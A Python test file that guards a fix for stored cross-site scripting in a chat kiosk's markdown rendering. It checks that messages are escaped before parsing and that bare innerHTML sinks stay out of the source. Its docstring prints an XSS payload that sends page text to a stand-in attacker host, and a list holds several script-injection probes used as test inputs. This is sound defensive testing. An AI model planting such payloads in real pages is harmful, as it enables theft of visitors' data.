"""A visitor's own message must not become HTML in the next visitor's browser.

WHAT WAS BROKEN. Every chat bubble was rendered with

    element.innerHTML = marked.parse(text)

and `marked` has passed raw HTML straight through since v5 dropped its
sanitize option. Our bundled copy has no sanitizer either: grep finds zero
matches for "sanitize" in static/vendor/marked/marked.min.js. So a visitor who
typed

    <img src=x onerror="fetch('https://evil.tld/?d='+document.body.innerText)">

got script execution on our own origin.

It did not stop there. saveToHistory() writes the message to localStorage and
loadHistory() replays it through the same sink on every later page load. At a
booth kiosk, which is what this product is for, the payload re-fired for every
later person who used that browser. The same page runs the companion sign-up
that asks for a name and a mobile number, so the script could read what the
next visitor typed and send it away. That is exactly the data the product is
trusted with.

THE FIX. One helper, renderMarkdown() in static/chat/core.js. It escapes &
and < before marked sees the text, so no tag can open, then checks link
protocols after parsing, because [x](javascript:...) contains no < to escape.

TWO TESTS, ON PURPOSE. The source scan is the one that will still be running
in a year: it fails the moment somebody adds a fourth theme with a bare
marked.parse. The node test proves the helper actually neutralises a real
payload, so the scan cannot pass while guarding a helper that does nothing.
"""
import json
import os
import re
import shutil
import subprocess

import pytest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CORE_JS = os.path.join(REPO_ROOT, "static", "chat", "core.js")
THEMES_DIR = os.path.join(REPO_ROOT, "themes")
MARKED = os.path.join(REPO_ROOT, "static", "vendor", "marked", "marked.min.js")

# `innerHTML = marked.parse(...)`, allowing a line break after the `=`.
RAW_SINK = re.compile(r"innerHTML\s*=\s*\n?\s*marked\.parse\s*\(")

# Raw text straight into innerHTML. The old no-marked fallback did exactly
# this: element.innerHTML = text.replace(/\n/g, '<br>').
BR_SINK = re.compile(r"innerHTML\s*=\s*\w+\.replace\(/\\n/g")


def _js_sources():
    """core.js plus every theme partial that could render a message."""
    yield "static/chat/core.js", CORE_JS
    for root, _dirs, names in os.walk(THEMES_DIR):
        for name in names:
            if name.endswith((".html", ".js")):
                path = os.path.join(root, name)
                yield os.path.relpath(path, REPO_ROOT), path


def test_only_the_helper_may_write_parsed_markdown_to_inner_html():
    """Every other call site must go through renderMarkdown()."""
    offenders = []
    for rel, path in _js_sources():
        with open(path, encoding="utf-8") as fh:
            src = fh.read()
        for match in RAW_SINK.finditer(src):
            line = src.count("\n", 0, match.start()) + 1
            # The single allowed sink is inside renderMarkdown itself, where
            # the text was escaped on the line above.
            if rel == "static/chat/core.js" and _inside_render_markdown(src, match.start()):
                continue
            offenders.append(f"{rel}:{line}")
    assert not offenders, (
        "These write marked.parse() output straight into innerHTML, which "
        "executes whatever a visitor typed. Call renderMarkdown(element, text) "
        "from static/chat/core.js instead:\n  " + "\n  ".join(offenders)
    )


def test_no_raw_text_is_written_to_inner_html_as_a_fallback():
    """The no-markdown fallback must be textContent, not innerHTML."""
    offenders = []
    for rel, path in _js_sources():
        with open(path, encoding="utf-8") as fh:
            src = fh.read()
        for match in BR_SINK.finditer(src):
            offenders.append(f"{rel}:{src.count(chr(10), 0, match.start()) + 1}")
    assert not offenders, (
        "A newline-to-<br> replace into innerHTML hands raw markup to the "
        "same sink marked.parse did. Use textContent:\n  " + "\n  ".join(offenders)
    )


def _inside_render_markdown(src: str, pos: int) -> bool:
    """Is `pos` within the renderMarkdown function body?

    Brace matching from the function's opening brace. Crude, and adequate:
    the alternative is a JavaScript parser for one lookup.
    """
    start = src.find("function renderMarkdown")
    if start == -1 or pos < start:
        return False
    depth, i = 0, src.index("{", start)
    for j in range(i, len(src)):
        if src[j] == "{":
            depth += 1
        elif src[j] == "}":
            depth -= 1
            if depth == 0:
                return pos < j
    return False


def test_the_helper_exists_and_escapes_before_parsing():
    """Guards the scan above from passing against a helper that does nothing."""
    with open(CORE_JS, encoding="utf-8") as fh:
        src = fh.read()
    assert "function renderMarkdown" in src, (
        "static/chat/core.js must define renderMarkdown(element, text)."
    )
    body_start = src.index("function renderMarkdown")
    body = src[body_start:body_start + 2000]
    assert "replace(/&/g, '&amp;')" in body and "replace(/</g, '&lt;')" in body, (
        "renderMarkdown must escape & and < BEFORE calling marked.parse. "
        "Without that the helper is decoration."
    )


# Every tag `marked` may legitimately emit from markdown. Anything outside this
# set in the output came from the payload, which means escaping failed.
MARKDOWN_TAGS = {
    "p", "br", "hr", "strong", "em", "del", "code", "pre", "blockquote",
    "ul", "ol", "li", "a", "img", "h1", "h2", "h3", "h4", "h5", "h6",
    "table", "thead", "tbody", "tr", "th", "td", "input",
}

TAG_NAME = re.compile(r"<\s*/?\s*([a-zA-Z][a-zA-Z0-9]*)")

# The REGION between < and >, i.e. an actual tag. Escaped text never produces
# one, because its < became &lt;. This is what separates a live attribute from
# the same characters shown as text, and getting it wrong is easy: an earlier
# version of this file only checked tag NAMES, and `img` is a legitimate
# markdown tag, so `<img src=x onerror=alert(1)>` slipped straight through the
# check while still executing.
TAG_REGION = re.compile(r"<[^>]*>")

# An inline event handler sitting inside a tag region. The whole payload class.
EVENT_ATTR = re.compile(r"[\s/]on[a-z]+\s*=", re.IGNORECASE)

# A script-bearing URL in an href or src.
BAD_URL = re.compile(r"""(href|src)\s*=\s*["']?\s*(javascript|data|vbscript):""",
                     re.IGNORECASE)

PAYLOADS = [
    '<img src=x onerror="alert(1)">',
    '<script>alert(1)</script>',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">click</a>',
    '<body onload=alert(1)>',
    'hello <b>bold</b> world',
]


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
@pytest.mark.skipif(not os.path.exists(MARKED), reason="bundled marked is missing")
def test_real_payloads_come_out_inert():
    """Run the actual escape + the actual bundled marked, and check the output.

    Not a mock of the rule: this loads static/vendor/marked/marked.min.js, the
    same file the browser loads, and applies the same two replaces the helper
    applies. If a future marked upgrade changed the behaviour, this fails.
    """
    script = r"""
const fs = require('fs');
const path = process.argv[1];
const src = fs.readFileSync(path, 'utf8');
const module_ = { exports: {} };
new Function('module', 'exports', src)(module_, module_.exports);
const marked = module_.exports.marked || module_.exports || globalThis.marked;
const parse = marked.parse ? marked.parse.bind(marked) : marked;

const payloads = JSON.parse(process.argv[2]);
const out = payloads.map(p =>
    parse(String(p).replace(/&/g, '&amp;').replace(/</g, '&lt;')));
console.log(JSON.stringify(out));
"""
    proc = subprocess.run(
        ["node", "-e", script, MARKED, json.dumps(PAYLOADS)],
        capture_output=True, text=True, timeout=60)
    assert proc.returncode == 0, f"node failed: {proc.stderr[:800]}"
    rendered = json.loads(proc.stdout.strip().splitlines()[-1])

    for payload, html in zip(PAYLOADS, rendered):
        # An allowlist of tag NAMES, not a substring search. `onerror=` appearing
        # inside &lt;img ... &gt; is the fix working: it is text, not an
        # attribute, because the < was escaped. A substring check cannot tell
        # those apart, so this asks what tags the output actually contains.
        produced = {m.lower() for m in TAG_NAME.findall(html)}
        illegal = produced - MARKDOWN_TAGS
        assert not illegal, (
            f"payload {payload!r} produced live tag(s) {sorted(illegal)}:\n  {html}"
        )
        # Tag names alone are not enough. `img` is a legal markdown tag, so
        # `<img src=x onerror=alert(1)>` passes the name check while still
        # executing. Look inside the real tags for handlers and script URLs.
        for tag in TAG_REGION.findall(html):
            assert not EVENT_ATTR.search(tag), (
                f"payload {payload!r} produced a live event handler:\n  {tag}"
            )
            assert not BAD_URL.search(tag), (
                f"payload {payload!r} produced a script-bearing URL:\n  {tag}"
            )
        # And it must still be VISIBLE as the text the visitor typed, not
        # silently dropped, or the chat would lie about what was said.
        assert "&lt;" in html or "<" not in payload, (
            f"payload {payload!r} vanished instead of being shown as text:\n  {html}"
        )


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
@pytest.mark.skipif(not os.path.exists(MARKED), reason="bundled marked is missing")
def test_ordinary_markdown_still_renders():
    """The fix must not cost the formatting the answers rely on.

    Escaping > as well would have been simpler and would have killed
    blockquotes, so that case is asserted explicitly.
    """
    script = r"""
const fs = require('fs');
const src = fs.readFileSync(process.argv[1], 'utf8');
const module_ = { exports: {} };
new Function('module', 'exports', src)(module_, module_.exports);
const marked = module_.exports.marked || module_.exports || globalThis.marked;
const parse = marked.parse ? marked.parse.bind(marked) : marked;
const input = process.argv[2];
console.log(JSON.stringify(parse(input.replace(/&/g,'&amp;').replace(/</g,'&lt;'))));
"""
    cases = {
        "**bold**": "<strong>",
        "*italic*": "<em>",
        "- one\n- two": "<li>",
        "[link](https://example.com)": 'href="https://example.com"',
        "> quoted": "<blockquote>",
        "`code`": "<code>",
        "# Heading": "<h1>",
    }
    for source, expected in cases.items():
        proc = subprocess.run(["node", "-e", script, MARKED, source],
                              capture_output=True, text=True, timeout=60)
        assert proc.returncode == 0, f"node failed: {proc.stderr[:400]}"
        html = json.loads(proc.stdout.strip().splitlines()[-1])
        assert expected in html, (
            f"markdown {source!r} stopped rendering: expected {expected!r} in {html!r}"
        )
